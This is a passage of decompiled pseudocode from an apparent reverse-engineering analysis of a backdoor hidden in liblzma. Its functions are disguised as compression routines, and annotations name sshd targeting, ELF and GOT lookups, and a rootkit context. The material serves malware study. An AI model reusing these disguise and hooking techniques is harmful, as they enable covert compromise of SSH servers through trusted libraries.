                  {
LABEL_43:
                    if ( v20[1] - 1 >= v19 )
                      v20[1] = v19;
                  }
                }
                v20 += 4;
              }
              while ( v20 != v14 );
            }
          }
        }
      }
      else
      {
        if ( v33 == 42494 )
          goto LABEL_37;
        if ( v33 == 269 && (v31 & 0x48) == 72 && (v32 & 0xFF00FF00) == 83886080 )
        {
          v19 = v17 + v34;
          goto LABEL_38;
        }
      }
    }
  }
  while ( 1 )
  {
    updated = Lstream_encoder_update_0(a1, 0LL, v6, v8, &v28);
    if ( !updated )
      break;
    v23 = v13;
    do
    {
      v24 = v23[2];
      if ( v24 )
      {
        if ( v24 < updated )
          goto LABEL_54;
        if ( *v23 < updated )
          *v23 = updated;
        if ( updated == v24 )
        {
LABEL_54:
          if ( v23[1] - 1 >= updated )
            v23[1] = updated;
        }
      }
      v23 += 4;
    }
    while ( v23 != v14 );
  }
  do
  {
    result = (__int64 *)v13[2];
    if ( result )
    {
      if ( (unsigned __int64)result < v8 )
        goto LABEL_68;
      if ( *v13 < v8 )
        *v13 = v8;
      if ( result == (__int64 *)v8 )
      {
LABEL_68:
        result = (__int64 *)(v13[1] - 1);
        if ( (unsigned __int64)result >= v8 )
          v13[1] = v8;
      }
    }
    v13 += 4;
  }
  while ( v13 != v14 );
  return result;
}
// 1010: using guessed type __int64 __fastcall Lstream_encode_1(_QWORD, _QWORD, _QWORD);
// 1B80: using guessed type __int64 __fastcall Lstream_encoder_update_0(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 2090: using guessed type __int64 __fastcall Llzip_decode_0(_QWORD, _QWORD, _QWORD);

//----- (0000000000002FE0) ----------------------------------------------------
__int64 __fastcall sub_2FE0(
        unsigned __int64 a1,
        unsigned __int64 a2,
        unsigned __int64 a3,
        unsigned __int64 a4,
        unsigned __int64 *a5,
        __int64 a6)
{
  __int64 result; // rax
  unsigned __int64 v7; // r15
  __int64 v8; // rcx
  __int64 *v10; // rdi
  unsigned __int64 v12; // r12
  char v13; // r11
  char v14; // al
  unsigned __int64 v15; // r8
  unsigned __int64 v16; // rsi
  int v17; // ebx
  char v18; // cl
  int v19; // eax
  char v20; // al
  bool v21; // zf
  __int16 v22; // dx
  int v23; // eax
  unsigned __int64 v27; // [rsp+30h] [rbp-98h]
  char v28; // [rsp+3Eh] [rbp-8Ah]
  char v29; // [rsp+3Fh] [rbp-89h]
  __int64 v30; // [rsp+48h] [rbp-80h] BYREF
  __int64 v31; // [rsp+50h] [rbp-78h]
  int v32; // [rsp+58h] [rbp-70h]
  char v33; // [rsp+63h] [rbp-65h]
  int v34; // [rsp+64h] [rbp-64h]
  char v35; // [rsp+68h] [rbp-60h]
  int v36; // [rsp+70h] [rbp-58h]
  unsigned __int64 v37; // [rsp+78h] [rbp-50h]

  result = 0LL;
  *a5 = 0LL;
  if ( a1 >= a2 )
    return result;
  v7 = a1;
  v8 = 22LL;
  v10 = &v30;
  while ( v8 )
  {
    *(_DWORD *)v10 = 0;
    v10 = (__int64 *)((char *)v10 + 4);
    --v8;
  }
  do
  {
    result = Llzma_filters_update_0(v7, a2, 1, 1, (char *)&v30);
    if ( !(_DWORD)result )
      return result;
    v12 = 0LL;
    if ( (v32 & 0x100) != 0 )
    {
      v12 = v37;
      if ( (v34 & 0xFF00FF00) == 83886080 )
        v12 = v30 + v37 + v31;
    }
    v13 = 0;
    if ( (v32 & 0x1040) == 0 )
      goto LABEL_17;
    if ( (v32 & 0x40) != 0 )
    {
      v13 = BYTE2(v34);
      if ( (v32 & 0x20) == 0 )
        goto LABEL_17;
      v14 = 2 * v33;
    }
    else
    {
      v13 = BYTE1(v32) & 0x10;
      if ( (v32 & 0x1000) == 0 )
        goto LABEL_17;
      v13 = v35;
      if ( (v32 & 0x20) == 0 )
        goto LABEL_17;
      v14 = 8 * v33;
    }
    v13 |= v14 & 8;
LABEL_17:
    v7 = v30 + v31;
    if ( v12 < a3 || v12 >= a4 )
      goto LABEL_55;
    v15 = v7 + 64;
    v16 = v30 + v31;
    if ( v7 + 64 > *(_QWORD *)(a6 + 96) )
      v15 = *(_QWORD *)(a6 + 96);
    v17 = 0;
    v18 = 0;
    while ( 1 )
    {
      v29 = v18;
      v28 = v13;
      v27 = v15;
      v19 = code_dasm(&v30, v16, v15);
      v15 = v27;
      v18 = v29;
      if ( !v19 )
      {
        ++v16;
        goto LABEL_53;
      }
      v16 = v30 + v31;
      if ( v36 == 265 )
      {
        v20 = v32 & 0x40;
        if ( (v32 & 0x1040) == 0 )
        {
          if ( !v20 )
            goto LABEL_48;
          goto LABEL_32;
        }
        if ( v20 )
        {
          v18 = BYTE2(v34);
          if ( (v32 & 0x20) != 0 )
            v18 = (2 * v33) & 8 | BYTE2(v34);
LABEL_32:
          LOBYTE(v17) = HIBYTE(v34);
          v21 = (v32 & 0x20) == 0;
LABEL_46:
          if ( !v21 )
            v17 |= (8 * v33) & 8;
          goto LABEL_48;
        }
        v18 = BYTE1(v32) & 0x10;
        if ( (v32 & 0x1000) != 0 )
        {
          v18 = v35;
          if ( (v32 & 0x20) != 0 )
            v18 = (8 * v33) & 8 | v35;
        }
      }
      else
      {
        if ( v36 != 267 )
          goto LABEL_48;
        v22 = v32 & 0x1040;
        if ( (v32 & 0x40) == 0 )
        {
          if ( !v22 )
            goto LABEL_48;
          LOBYTE(v17) = BYTE1(v32) & 0x10;
          if ( (v32 & 0x1000) == 0 )
          {
            if ( v28 == v29 )
            {
              v23 = 0;
              goto LABEL_51;
            }
            goto LABEL_53;
          }
          LOBYTE(v17) = v35;
          v21 = (v32 & 0x20) == 0;
          goto LABEL_46;
        }
        v18 = HIBYTE(v34);
        if ( (v32 & 0x20) != 0 )
        {
          v18 = (8 * v33) & 8 | HIBYTE(v34);
          if ( v22 )
            v17 = BYTE2(v34) | (2 * v33) & 8;
        }
        else if ( v22 )
        {
          LOBYTE(v17) = BYTE2(v34);
        }
      }
LABEL_48:
      if ( v28 == v18 )
        break;
LABEL_53:
      if ( v16 >= v27 )
        goto LABEL_55;
      v23 = v17;
      LOBYTE(v17) = v28;
LABEL_51:
      v13 = v17;
      v17 = v23;
    }
    if ( (_BYTE)v17 != 7 )
    {
      v23 = v17;
      goto LABEL_51;
    }
    result = Llzma_optimum_normal_0(v30 + v31, v27, *(_QWORD *)(*(_QWORD *)(a6 + 32) + 168LL), (char *)&v30);
    if ( (_DWORD)result )
    {
      *a5 = v12;
      return result;
    }
LABEL_55:
    result = a2;
  }
  while ( v7 < a2 );
  return result;
}

//----- (00000000000032B0) ----------------------------------------------------
__int64 __fastcall Llzma_auto_decode_1(__int64 a1, unsigned int a2, unsigned __int64 a3, unsigned __int64 a4)
{
  char *i; // rdx
  char *v7; // rax
  char *v8; // rbx
  __int64 result; // rax
  unsigned int v10[11]; // [rsp+Ch] [rbp-2Ch] BYREF

  v10[0] = a2;
  if ( (unsigned int)Llzma_index_iter_rewind_cold(0xD2u, 4u, 0xDu, 0) )
  {
    for ( i = 0LL; ; i = v8 + 1 )
    {
      v7 = Llzip_decode_0(a1, v10, i);
      v8 = v7;
      if ( !v7 )
        break;
      result = Lstream_encode_1(a3, a4, (__int64)v7);
      if ( result )
        return result;
    }
  }
  return 0LL;
}
// 32B0: using guessed type unsigned int var_2C[11];

//----- (0000000000003330) ----------------------------------------------------
__int64 __fastcall sub_3330(
        unsigned __int64 a1,
        unsigned __int64 a2,
        unsigned __int64 a3,
        unsigned __int64 a4,
        unsigned __int64 *a5,
        __int64 a6)
{
  __int64 v10; // rcx
  __int64 *v11; // rdi
  unsigned __int64 v12; // r14
  char v14; // dl
  char v15; // al
  char v16; // r8
  __int64 v17; // rcx
  __int64 v18; // rsi
  __int64 *v19; // rdi
  unsigned __int64 v20; // rsi
  char v21; // al
  char v22; // dl
  __int64 v23; // rax
  unsigned __int64 v24; // rdx
  int v25; // eax
  __int64 v26; // rax
  int v28; // [rsp+28h] [rbp-E0h]
  char v29; // [rsp+2Fh] [rbp-D9h]
  __int64 v30; // [rsp+30h] [rbp-D8h] BYREF
  __int64 v31; // [rsp+38h] [rbp-D0h]
  __int16 v32; // [rsp+40h] [rbp-C8h]
  char v33; // [rsp+4Bh] [rbp-BDh]
  int v34; // [rsp+4Ch] [rbp-BCh]
  char v35; // [rsp+50h] [rbp-B8h]
  int v36; // [rsp+58h] [rbp-B0h]
  __int64 v37; // [rsp+60h] [rbp-A8h]
  __int64 v38; // [rsp+70h] [rbp-98h]
  __int64 v39; // [rsp+88h] [rbp-80h] BYREF
  __int64 v40; // [rsp+90h] [rbp-78h]
  __int16 v41; // [rsp+98h] [rbp-70h]
  char v42; // [rsp+A3h] [rbp-65h]
  int v43; // [rsp+A4h] [rbp-64h]
  char v44; // [rsp+A8h] [rbp-60h]
  int v45; // [rsp+B0h] [rbp-58h]
  __int64 v46; // [rsp+B8h] [rbp-50h]

  v10 = 22LL;
  v11 = &v30;
  while ( v10 )
  {
    *(_DWORD *)v11 = 0;
    v11 = (__int64 *)((char *)v11 + 4);
    --v10;
  }
  *a5 = 0LL;
  v12 = Llzma_auto_decode_1(a6, 0x1E0u, a3, a4);
  if ( !v12 )
    return 0LL;
  while ( 1 )
  {
    while ( 1 )
    {
      if ( v12 >= a4 )
        return 0LL;
      if ( (unsigned int)code_dasm(&v30, v12, a4) )
        break;
      ++v12;
    }
    if ( (v36 & 0xFFFFFFFD) == 177 )
    {
      if ( BYTE1(v34) != 3 )
        goto LABEL_9;
      v14 = v32 & 0x20;
      if ( (v32 & 0x20) != 0 && (v33 & 8) != 0 )
        goto LABEL_9;
      v15 = v32 & 0x40;
      if ( (v32 & 0x1040) != 0 )
      {
        if ( !v15 )
        {
          v16 = HIBYTE(v32) & 0x10;
          if ( (v32 & 0x1000) == 0 )
            goto LABEL_26;
          v16 = v35;
          if ( v14 )
            v16 = (8 * v33) & 8 | v35;
LABEL_25:
          if ( v15 == v16 )
            goto LABEL_26;
          goto LABEL_9;
        }
        v15 = HIBYTE(v34);
        v16 = BYTE2(v34);
        if ( !v14 )
          goto LABEL_25;
        v16 = (2 * v33) & 8 | BYTE2(v34);
      }
      else
      {
        if ( !v15 )
        {
          v16 = 0;
LABEL_26:
          v17 = 22LL;
          v18 = v31;
          v19 = &v39;
          while ( v17 )
          {
            *(_DWORD *)v19 = 0;
            v19 = (__int64 *)((char *)v19 + 4);
            --v17;
          }
          v20 = v30 + v18;
          while ( 1 )
          {
            if ( v20 >= a4 )
              goto LABEL_9;
            if ( (unsigned int)v17 > 5 )
              goto LABEL_9;
            v29 = v16;
            v28 = v17;
            if ( !(unsigned int)code_dasm(&v39, v20, a4) )
              goto LABEL_9;
            v16 = v29;
            if ( v45 != 265 )
            {
              if ( v45 == 42494 )
                goto LABEL_9;
              goto LABEL_50;
            }
            if ( (v43 & 0xFF00FF00) != 83886080 )
              goto LABEL_50;
            v21 = 0;
            if ( (v41 & 0x1040) != 0 )
            {
              if ( (v41 & 0x40) == 0 )
              {
                v21 = HIBYTE(v41) & 0x10;
                if ( (v41 & 0x1000) == 0 )
                  goto LABEL_43;
                v21 = v44;
                if ( (v41 & 0x20) == 0 )
                  goto LABEL_43;
                v22 = 8 * v42;
                goto LABEL_42;
              }
              v21 = BYTE2(v43);
              if ( (v41 & 0x20) != 0 )
              {
                v22 = 2 * v42;
LABEL_42:
                v21 |= v22 & 8;
              }
            }
LABEL_43:
            if ( v21 == v29 )
            {
              v23 = 0LL;
              if ( (v41 & 0x100) != 0 )
                v23 = v40 + v39 + v46;
              v24 = v23 - 24;
              if ( v23 != 24 && v23 - 24 >= a1 && a2 >= v23 + 4 )
                goto LABEL_66;
            }
LABEL_50:
            v20 += v40;
            LODWORD(v17) = v28 + 1;
          }
        }
        v15 = HIBYTE(v34);
        v16 = 0;
        if ( !v14 )
          goto LABEL_25;
      }
      v15 |= (8 * v33) & 8;
      goto LABEL_25;
    }
    if ( v36 == 327 )
      break;
    if ( v36 == 42494 && a3 != v30 )
      return 0LL;
LABEL_9:
    v12 += v31;
  }
  if ( (v33 & 8) != 0 )
    goto LABEL_9;
  v25 = v34;
  LOBYTE(v25) = 0;
  if ( v25 != 83886080 )
    goto LABEL_9;
  if ( (v32 & 0x800) == 0 )
    goto LABEL_9;
  v26 = v38;
  if ( v38 )
    goto LABEL_9;
  if ( (v32 & 0x100) != 0 )
    v26 = v31 + v30 + v37;
  v24 = v26 - 24;
  if ( a2 < v26 + 4 || a1 > v24 || v26 == 24 )
    goto LABEL_9;
LABEL_66:
  *a5 = v24;
  return 1LL;
}

//----- (0000000000003670) ----------------------------------------------------
__int64 __fastcall Llzma_buf_cpy_0(
        unsigned __int64 a1,
        unsigned __int64 a2,
        unsigned __int64 a3,
        unsigned __int64 a4,
        __int64 a5,
        __int64 *a6)
{
  __int64 v6; // r15
  __int64 *v7; // rdi
  __int64 v10; // rcx
  char v11; // r14
  unsigned __int64 v12; // r10
  unsigned __int8 v13; // r13
  __int64 *v14; // rdi
  __int64 i; // rcx
  int v16; // eax
  char v17; // al
  unsigned __int8 v18; // al
  __int64 j; // rcx
  __int64 v20; // r9
  __int64 v21; // rdx
  __int64 v22; // r10
  __int64 v23; // rsi
  unsigned __int64 v27; // [rsp+28h] [rbp-110h]
  __int64 v28; // [rsp+38h] [rbp-100h] BYREF
  __int64 v29; // [rsp+40h] [rbp-F8h]
  __int16 v30; // [rsp+48h] [rbp-F0h]
  char v31; // [rsp+53h] [rbp-E5h]
  int v32; // [rsp+54h] [rbp-E4h]
  char v33; // [rsp+58h] [rbp-E0h]
  unsigned __int64 v34; // [rsp+68h] [rbp-D0h]
  __int64 v35[21]; // [rsp+90h] [rbp-A8h] BYREF

  *a6 = 0LL;
  v6 = *(_QWORD *)(a5 + 8);
  if ( !v6 )
    return 0LL;
  v7 = v35;
  v10 = 32LL;
  v11 = -1;
  v12 = 0LL;
  v13 = 0;
  while ( v10 )
  {
    *(_DWORD *)v7 = 0;
    v7 = (__int64 *)((char *)v7 + 4);
    --v10;
  }
  v14 = &v28;
  for ( i = 22LL; i; --i )
  {
    *(_DWORD *)v14 = 0;
    v14 = (__int64 *)((char *)v14 + 4);
  }
  while ( a3 < a4 )
  {
    v27 = v12;
    if ( !(unsigned int)Llzma_optimum_normal_0(a3, a4, v6, (char *)&v28) )
      break;
    a3 = v28 + v29;
    v16 = Llzma_properties_size_0(v28 + v29, v28 + v29 + 32, (char *)&v28, 265, 0LL);
    v12 = v27;
    if ( v16 )
    {
      if ( (v30 & 0x1040) == 0 )
        goto LABEL_19;
      if ( (v30 & 0x40) != 0 )
      {
        v11 = BYTE2(v32);
        if ( (v30 & 0x20) == 0 )
          goto LABEL_19;
        v17 = 2 * v31;
        goto LABEL_18;
      }
      if ( (v30 & 0x1000) != 0 )
      {
        v11 = v33;
        if ( (v30 & 0x20) == 0 )
          goto LABEL_19;
        v17 = 8 * v31;
LABEL_18:
        v11 |= v17 & 8;
LABEL_19:
        if ( !v11 )
          goto LABEL_21;
        a3 = v28 + v29;
      }
      else
      {
LABEL_21:
        if ( (v30 & 0x100) != 0 )
        {
          v12 = v34;
          if ( (v32 & 0xFF00FF00) == 83886080 )
            v12 = v29 + v28 + v34;
        }
        if ( v12 >= a1 && v12 < a2 )
        {
          v18 = v13 + 1;
          v35[v13] = v12;
          if ( (unsigned __int8)(v13 + 1) > 0xFu )
            goto LABEL_30;
          ++v13;
        }
        v11 = 0;
        a3 = v28 + v29;
      }
    }
  }
  v18 = v13;
LABEL_30:
  for ( j = 0LL; (unsigned int)j < v18; ++j )
  {
    v20 = v35[j];
    v21 = 0LL;
    do
    {
      v22 = v35[v21];
      v23 = 0LL;
      do
      {
        if ( v20 == v22 - 8 && v22 == v35[v23] - 8 )
        {
          *a6 = v20;
          return 1LL;
        }
        ++v23;
      }
      while ( (unsigned int)v23 < v18 );
      ++v21;
    }
    while ( (unsigned int)v21 < v18 );
  }
  return 0LL;
}
// 3670: using guessed type __int64 var_A8[21];

//----- (0000000000003860) ----------------------------------------------------
__int64 __fastcall Llzma_check_finish_0(__int64 a1, __int64 a2, __int64 a3)
{
  unsigned int v3; // r12d
  unsigned __int64 v4; // r14
  unsigned __int64 v5; // r13
  int inited; // eax
  __int64 *v8; // rdi
  __int64 v9; // rcx
  __int64 v10; // rbx
  __int64 v12[16]; // [rsp+8h] [rbp-80h] BYREF

  v3 = 0;
  v4 = *(_QWORD *)(a3 + 40);
  if ( v4 )
  {
    v5 = *(_QWORD *)(a3 + 48);
    inited = Lstream_encoder_mt_init_1(v4, v5, 0LL, a1);
    v8 = v12;
    v9 = 22LL;
    v3 = inited != 0;
    v10 = a1 + 16;
    while ( v9 )
    {
      *(_DWORD *)v8 = 0;
      v8 = (__int64 *)((char *)v8 + 4);
      --v9;
    }
    if ( (unsigned int)Lstream_encoder_mt_init_1(v4, v5, (char *)v12, v10) )
    {
      if ( (unsigned int)Lstream_encoder_mt_init_1(v12[0] + v12[1], v5, 0LL, v10) )
        v3 += 2;
      else
        ++v3;
    }
  }
  return v3;
}

//----- (0000000000003900) ----------------------------------------------------
__int64 __fastcall Llzma_decoder_init_1(__int64 a1, __int64 a2, __int64 a3)
{
  unsigned int v3; // r12d
  unsigned __int64 v4; // r13
  unsigned __int64 v5; // r14
  _BOOL4 v6; // r12d
  int v7; // r12d

  v3 = 0;
  v4 = *(_QWORD *)(a3 + 72);
  if ( v4 )
  {
    v5 = *(_QWORD *)(a3 + 80);
    v6 = Lstream_encoder_mt_init_1(v4, v5, 0LL, a1) != 0;
    v7 = v6 - (((unsigned int)Lstream_encoder_mt_init_1(v4, v5, 0LL, a1 + 16) == 0) - 1);
    return v7 - ((unsigned int)((unsigned int)Lstream_encoder_mt_init_1(v4, v5, 0LL, a1 + 8) == 0) - 1);
  }
  return v3;
}

//----- (0000000000003980) ----------------------------------------------------
__int64 __fastcall Llzma_delta_coder_init_1(__int64 a1, __int64 a2, __int64 a3)
{
  unsigned __int64 v4; // rdi

  v4 = *(_QWORD *)(a3 + 104);
  if ( !v4 )
    return 0LL;
  if ( (unsigned int)Lstream_encoder_mt_init_1(v4, *(_QWORD *)(a3 + 112), 0LL, a1) )
    return 3LL;
  return 0LL;
}

//----- (00000000000039B0) ----------------------------------------------------
__int16 *__fastcall Llzma_encoder_init_0(char a1, __int16 *a2)
{
  __int16 *result; // rax
  __int16 v3; // dx
  __int16 v4; // cx

  result = a2;
  if ( a1 != 45 )
    return 0LL;
  while ( 1 )
  {
    v4 = *result;
    v3 = *result << 8;
    LOBYTE(v4) = 0;
    if ( v4 == 25600 || v3 == 25600 )
      break;
    if ( (*result & 0xDF00) == 0 || v4 == 2304 || v4 == 15616 || (v3 & 0xDF00) == 0 || v3 == 15616 || v3 == 2304 )
      return 0LL;
    ++result;
  }
  return result;
}

//----- (0000000000003A10) ----------------------------------------------------
// a2: 0x00007fffffffedb0
__int64 __fastcall traversal_dynstr_sshd(struct_elf_info *a1, char **a2)
{
  char *v3; // r12
  char *v4; // rdi
  unsigned int v5; // eax
  __int64 v6; // r8
  bool v7; // zf
  __int64 v8; // r8
  __int16 *v9; // rsi
  char **argv_q; // r12
  char *v11; // r13
  unsigned __int64 freespaces; // rax
  __int64 free_spaces[7]; // [rsp+18h] [rbp-38h] BYREF
  __int64 savedregs; // [rsp+50h] [rbp+0h] BYREF

  if ( &savedregs < (__int64 *)a2 && (unsigned __int64)((char *)a2 - (char *)&savedregs) <= 0x2000 )
  {
    v3 = *a2;
    if ( (unsigned __int64)(*a2 - 1) <= 0x1F )
    {
      v4 = a2[1];
      if ( a2 < (char **)v4 )
      {
        if ( v4 )
        {
          if ( (unsigned __int64)(v4 - (char *)a2) <= 0x4000 )
          {
            v5 = (unsigned int)table_get(v4, 0LL);// v4: /usr/sbin/sshd
            v6 = 1LL;
            if ( v5 == sshd_proc )
            {
              while ( 1 )
              {
                v7 = v6 == (_QWORD)v3;
                v8 = v6 + 1;
                if ( v7 )
                  break;
                v9 = (__int16 *)a2[v8];
                if ( a2 >= (char **)v9
                  || !v9
                  || (unsigned __int64)((char *)v9 - (char *)a2) > 0x4000
                  || Llzma_encoder_init_0(*v9, v9) )
                {
                  return 0LL;
                }
              }
              if ( !a2[v8] )
              {
                argv_q = &a2[v8 + 1];
                while ( 1 )
                {
                  v11 = *argv_q;
                  if ( !*argv_q )
                    break;
                  if ( a2 >= (char **)v11 || (unsigned __int64)(v11 - (char *)a2) > 0x4000 )
                  {
                    free_spaces[0] = 0LL;
                    freespaces = maybe_find_freespaces(a1, (unsigned __int64 *)free_spaces, 1);
                    if ( !freespaces
                      || (unsigned __int64)(v11 + 44) > freespaces + free_spaces[0]
                      || (unsigned __int64)v11 < freespaces )
                    {
                      break;
                    }
                  }
                  if ( (unsigned int)table_get(*argv_q, 0LL) )// go through .dynstr of sshd
                    break;
                  if ( !*++argv_q )
                    return 1LL;
                }
              }
            }
          }
        }
      }
    }
  }
  return 0LL;
}
// 3A95: variable 'v6' is possibly undefined
// 3A10: using guessed type __int64 free_spaces[7];

//----- (0000000000003B70) ----------------------------------------------------
_BOOL8 __fastcall sub_3B70(__int64 a1, __int64 a2, unsigned __int64 a3, __int64 a4)
{
  __int64 v6; // rcx
  char *v7; // rdi
  __int64 v9; // rax
  void (__fastcall *v10)(__int64, __int64 *, __int64 *, __int64 *, double); // r8
  __int64 v12; // rax
  bool v13; // zf
  __int64 v14; // r12
  unsigned __int64 v15; // rbp
  __int64 v16; // [rsp+10h] [rbp-6A0h] BYREF
  __int64 v17; // [rsp+18h] [rbp-698h] BYREF
  __int64 v18; // [rsp+20h] [rbp-690h] BYREF
  __int64 v19; // [rsp+28h] [rbp-688h] BYREF
  __int64 v20[4]; // [rsp+30h] [rbp-680h]
  __int128 v21; // [rsp+50h] [rbp-660h] BYREF
  char v22; // [rsp+60h] [rbp-650h] BYREF

  v6 = 390LL;
  v7 = &v22;
  while ( v6 )
  {
    *(_DWORD *)v7 = 0;
    v7 += 4;
    --v6;
  }
  v21 = 0LL;
  if ( a1 )
  {
    if ( a4 )
    {
      v9 = *(_QWORD *)(a4 + 8);
      if ( v9 )
      {
        v10 = *(void (__fastcall **)(__int64, __int64 *, __int64 *, __int64 *, double))(v9 + 48);
        if ( v10 )
        {
          if ( *(_QWORD *)(v9 + 56) )
          {
            v16 = 0LL;
            v17 = 0LL;
            v18 = 0LL;
            v10(a1, &v16, &v17, &v18, 0.0);
            v12 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a4 + 8) + 56LL))(a1);
            if ( v16 )
            {
              if ( v17 )
              {
                if ( v18 )
                {
                  if ( v12 )
                  {
                    v13 = *(_QWORD *)(a4 + 8) == 0LL;
                    v20[0] = v16;
                    v19 = 0LL;
                    v20[1] = v17;
                    v20[2] = v18;
                    v20[3] = v12;
                    if ( !v13 )
                    {
                      v14 = 0LL;
                      v15 = 0LL;
                      while ( (unsigned int)sub_7350(
                                              (__int64)&v21 + v15,
                                              1576 - v15,
                                              &v19,
                                              v20[v14],
                                              *(_QWORD *)(a4 + 8)) )
                      {
                        v15 += v19;
                        if ( v15 > 0x628 )
                          break;
                        if ( ++v14 == 4 )
                          return sub_72E0((__int64)&v21, v15, a2, a3, *(_QWORD *)(a4 + 8));
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return 0LL;
}

//----- (0000000000003CD0) ----------------------------------------------------
__int64 __fastcall parse_elf_invoke(elf_parse_result *a1)
{
  char *stack_end; // rax
  struct_elf_info *v4; // rdi
  char **v5; // r12

  if ( !(unsigned int)parse_elf(a1->elf_ehdr, a1->elf_info_arr[1]) )
    return 0LL;
  stack_end = import_lookup_get_str(a1->elf_info_arr[1], __libc_stack_end, GLIBC_2_2_5);
  if ( !stack_end )
    return 0LL;
  v4 = (struct_elf_info *)*((_QWORD *)a1->elf_info_arr + 1);
  v5 = (char **)&v4->elf_hdr->e_ident[*((_QWORD *)stack_end + 1)];// we create a string array at the end of stack?
  if ( !(unsigned int)traversal_dynstr_sshd((__int64)v4, *v5) )
    return 0LL;
  *a1->argv0 = *v5;
  return 1LL;
}

//----- (0000000000003D40) ----------------------------------------------------
__int64 __fastcall Llzma_lzma2_encoder_memusage_0(__int64 a1, __int64 a2, __int64 a3)
{
  int inited; // ebx
  int v5; // ebx

  if ( !a1 )
    return 0LL;
  inited = Llzma_delta_coder_init_1(a1, a2, a3);
  v5 = Llzma_decoder_init_1(a1, a2, a3) + inited;
  return 2 * v5 + (unsigned int)Llzma_check_finish_0(a1, a2, a3);
}

//----- (0000000000003DA0) ----------------------------------------------------
__int64 __fastcall Llzma_mf_bt4_find_0(__int64 *a1, __int64 a2, __int64 a3)
{
  __int64 v5; // rax
  unsigned __int64 v6; // rax
  unsigned __int64 v7; // r15
  __int64 *v8; // rdi
  __int64 v9; // rcx
  __int64 v10; // rbx
  __int64 *v11; // r10
  __int64 v12; // rax
  __int64 v13; // rdi
  int *v14; // rdi
  __int64 i; // rcx
  __int64 j; // rax
  __int64 v17; // rdx
  int v18; // ecx
  __int64 v19; // rax
  __int64 v20; // rdx
  unsigned int v21; // ecx
  __int64 v22; // rax
  __int64 v23; // [rsp+0h] [rbp-E8h]
  __int64 *v24; // [rsp+8h] [rbp-E0h]
  unsigned __int64 v25; // [rsp+18h] [rbp-D0h] BYREF
  __int64 v26[5]; // [rsp+20h] [rbp-C8h] BYREF
  int v27[10]; // [rsp+48h] [rbp-A0h] BYREF
  __int64 v28[15]; // [rsp+70h] [rbp-78h] BYREF

  if ( !(unsigned int)Llzma_index_iter_rewind_cold(0xDAu, 0x14u, 0xFu, 0) )
    return 0LL;
  v5 = *(_QWORD *)(a3 + 32);
  v25 = 0LL;
  if ( !*(_QWORD *)(v5 + 168) )
    return 0LL;
  *(_QWORD *)(a3 + 72) = 0LL;
  v6 = maybe_find_freespaces(a1, &v25, 0);
  v7 = v6;
  if ( !v6 )
    return 0LL;
  v8 = v28;
  v9 = 20LL;
  v10 = 0LL;
  v11 = v26;
  v23 = v6 + v25;
  v26[0] = 0x500000004LL;
  v26[1] = 0x700000006LL;
  v26[2] = 0x900000008LL;
  v26[3] = 0xB0000000ALL;
  v26[4] = 0xD0000000CLL;
  while ( v9 )
  {
    *(_DWORD *)v8 = 0;
    v8 = (__int64 *)((char *)v8 + 4);
    --v9;
  }
  do
  {
    v12 = a2 + 32LL * *((unsigned int *)v11 + v10);
    v13 = *(_QWORD *)(v12 + 8);
    if ( v13 )
    {
      v24 = v11;
      sub_2FE0(v13, *(_QWORD *)(v12 + 16), v7, v23, &v28[v10], a3);
      v11 = v24;
    }
    ++v10;
  }
  while ( v10 != 10 );
  v14 = v27;
  for ( i = 10LL; i; --i )
    *v14++ = 0;
  for ( j = 0LL; j != 10; ++j )
  {
    v17 = 0LL;
    while ( 1 )
    {
      v18 = v17;
      if ( (unsigned int)v17 >= (unsigned int)j )
        break;
      if ( v28[v17++] == v28[j] )
      {
        ++v27[v18];
        goto LABEL_20;
      }
    }
    ++v27[j];
LABEL_20:
    ;
  }
  v19 = 0LL;
  v20 = 0LL;
  v21 = 0;
  do
  {
    if ( v21 < v27[v19] )
    {
      v20 = (unsigned int)v19;
      v21 = v27[v19];
    }
    ++v19;
  }
  while ( v19 != 10 );
  if ( v21 <= 4 )
    return 0LL;
  v22 = v28[v20];
  if ( !v22 )
    return 0LL;
  *(_QWORD *)(a3 + 72) = v22;
  return 1LL;
}
// 2FE0: using guessed type __int64 __fastcall sub_2FE0(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 3DA0: using guessed type __int64 var_78[15];
// 3DA0: using guessed type int var_A0[10];

//----- (0000000000003F50) ----------------------------------------------------
__int64 __fastcall Llzma_stream_decoder_init_1(rootkit_ctx *a1)
{
  __int64 result; // rax

  result = ro_gots.cpu_id;
  a1->cpu_id_got = result;
  return result;
}

//----- (0000000000003F70) ----------------------------------------------------
rootkit_ctx *__fastcall get_rodata_ptr_offset(rootkit_ctx *a1)
{
  rootkit_ctx *offset_of_Lx86coder; // rax

  offset_of_Lx86coder = (rootkit_ctx *)*(&rodata_ptr_offset + 1);
  a1->self = offset_of_Lx86coder;
  return offset_of_Lx86coder;
}
// CAC8: using guessed type __int64 rodata_ptr_offset;

//----- (0000000000003F90) ----------------------------------------------------
__int64 __fastcall get_ehdr_address(rootkit_ctx *a1)
{
  __int64 v1; // rdx
  __int64 offset; // rdx
  __int64 result; // rax

  a1->runtime_addr = (__int64)&Lx86_coder_destroy;
  get_rodata_ptr_offset(a1);                    // >self = *(&rodata_ptr_offset + 1)
  offset = v1 - (unsigned __int64)a1->self;     // v1 = &Lx86_coder_destroy
  a1->runtime_offset = offset;
  a1->cpuid_got_ptr = *(__int64 *)(rodata_ptr_offset + offset) >> 56;
  result = 0LL;
  a1->cpu_id_got = 0LL;
  return result;
}
// 3FAA: variable 'v1' is possibly undefined
// AE18: using guessed type __int64 Lx86_coder_destroy;
// CAC8: using guessed type __int64 rodata_ptr_offset;

//----- (0000000000003FD0) ----------------------------------------------------
__int64 __fastcall Llzma_block_param_decoder_0(__int64 a1, int a2)
{
  char *v2; // rdx
  __int64 result; // rax
  char v4; // [rsp+0h] [rbp-8h] BYREF

  v2 = &v4;
  LODWORD(result) = 0;
  do
  {
    result = (unsigned int)(result + 1);
    v2 -= 8;
    *((_QWORD *)v2 + 1) = 0LL;
  }
  while ( (a2 == 0 ? 128 : 4072) != (_DWORD)result );
  return result;
}

//----- (0000000000004000) ----------------------------------------------------
void *__fastcall set_rkctx_self(rootkit_ctx *a1)
{
  void *result; // rax

  result = ro_gots;
  a1->self = (rootkit_ctx *)ro_gots;
  return result;
}

//----- (0000000000004020) ----------------------------------------------------
// 0x7ffff7fab240
__int64 __fastcall backdoor_ctx_save(rootkit_ctx *ctx)
{
